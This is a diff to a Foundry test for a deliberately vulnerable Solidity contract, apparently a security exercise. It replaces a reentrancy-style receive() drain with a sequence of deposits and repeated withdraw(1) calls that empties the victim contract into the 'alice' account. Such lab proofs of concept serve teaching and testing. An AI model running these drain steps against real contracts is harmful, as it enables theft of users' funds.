@@ -6,31 +6,39 @@ import {DeleteUser} from "../src/DeleteUser.sol";
 
 contract DeleteUserTest is Test {
     DeleteUser public victimContract;
-    address public attacker;
+
+    address alice = makeAddr("alice");
+
+    struct User {
+        address addr;
+        uint256 balance;
+    }
 
     function setUp() public {
-        attacker = makeAddr("attacker");
         victimContract = new DeleteUser();
         victimContract.deposit{value: 1 ether}();
+        vm.deal(alice, 1 ether);
     }
 
-    function testExploit() public {
-        uint64 nonceBefore = vm.getNonce(attacker);
+    function testDrainContract() public {
+        console.log("ADDRESS_ALCIE", alice);
+        console.log("ADDRESS_THIS", address(this));
+        console.log("--------------------------------");
 
-        vm.startPrank(attacker);
-        //victimContract.deposit{value: 0}();
-        victimContract.withdraw(0);
-        vm.stopPrank();
+        vm.startPrank(alice);
+        victimContract.deposit{value: 1 ether}();
+        victimContract.deposit{value: 0 ether}();
 
-        assertEq(address(victimContract).balance, 0, "Contract balance should be zero");
-        assertEq(vm.getNonce(attacker) - nonceBefore, 1, "Must exploit in one transaction");
-    }
+        victimContract.withdraw(1);
+        victimContract.withdraw(1);
 
-    receive() external payable {
-        if (address(victimContract).balance > 0) {
-            vm.startPrank(attacker);
-            victimContract.withdraw(0);
-            vm.stopPrank();
-        }
+        uint256 balance = address(victimContract).balance;
+        uint256 aliceBalance = alice.balance;
+
+        console.log("Balance", balance);
+        console.log("Alice Balance", aliceBalance);
+
+        assertEq(address(victimContract).balance, 0);
+        assertEq(alice.balance, 2 ether);
     }
 }
